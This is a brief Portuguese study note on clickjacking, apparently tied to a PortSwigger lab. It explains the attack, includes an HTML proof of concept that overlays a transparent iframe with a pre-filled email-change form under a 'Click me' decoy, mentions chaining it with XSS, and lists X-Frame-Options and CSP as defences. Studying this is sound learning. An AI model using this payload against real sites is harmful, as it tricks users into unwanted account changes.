#attack #attack/web #web

Clickjacking é um ataque que engana o usuário para clicar em um elemento da página que é invisível ou que está disfarçado como outro elemento.

No ataque, o hacker incorpora o site legítimo com um `iframe` no site falso.

Lab: [[Clickjacking - basic clickjacking with CSRF token]]

O Burp oferece o **Clickbandit** para criar POC.

### Form pré-preenchido

Algumas vezes é possível preencher os campos de um formulário, usando parâmetros GET, quando a página carrega. Com isso, o hacker pode enviar o payload de clickjacking para que o usuário pressione o botão de submit do formulário.

```html
<style>
iframe {
	position:relative;
	width: 500px;
	height: 700px;
	opacity: 0.1;
	z-index: 2;
}

div {
	position:absolute;
	top:470px;
	left:60px;
	z-index: 1;
}
</style>

<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```

### Clickjacking + XSS

É possível combinar essas duas vulnerabilidades, quando é identificado uma falha XSS mas que precisa de um click do usuário para disparar o payload. Se a página também for vulnerável à clickjacking, você pode abusar disso para explorar o payload XSS.

## Como prevenir

- `X-Frame-Options`
- [[XSS#Content security policy (CSP) |CSP]]
## Referência
https://portswigger.net/web-security/clickjacking